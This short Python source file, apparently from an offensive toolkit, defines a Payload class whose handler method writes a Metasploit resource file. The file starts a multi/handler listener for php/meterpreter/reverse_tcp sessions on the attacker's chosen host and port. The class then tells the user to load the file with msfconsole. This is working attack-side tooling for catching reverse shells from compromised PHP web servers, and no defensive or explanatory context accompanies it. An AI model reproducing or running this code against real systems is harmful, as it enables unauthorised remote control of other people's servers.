__author__ = 'rotlogix'

import urlparse
from blessings import Terminal


class Payload:

    t = Terminal()

    def __init__(self, lhost, lport, target, shell):

        self.lhost = lhost
        self.lport = lport
        self.target = target
        self.shell = shell

    def handler(self):

        # parse and break down url
        parsed = urlparse.urlsplit(self.target)
        domain = parsed.scheme + "://" + parsed.netloc
        # build handler
        opt = "use multi/handler\n"
        opt += "set payload php/meterpreter/reverse_tcp\n"
        opt += "set LHOST {0}\n set LPORT {1}\n".format(self.lhost, self.lport)
        opt += "set ExitOnSession false\n"
        opt += "exploit -j\n"
        # o / w / c rc file
        f = file("php_listener.rc", "w")
        f.write(opt)
        f.close()
        # print information
        print((Payload.t.green(" [*] ") + "Generated Metasploit Resource File"))
        print((Payload.t.red(" [!] ") + "Load Metasploit: msfconsole -r php_listener.rc"))
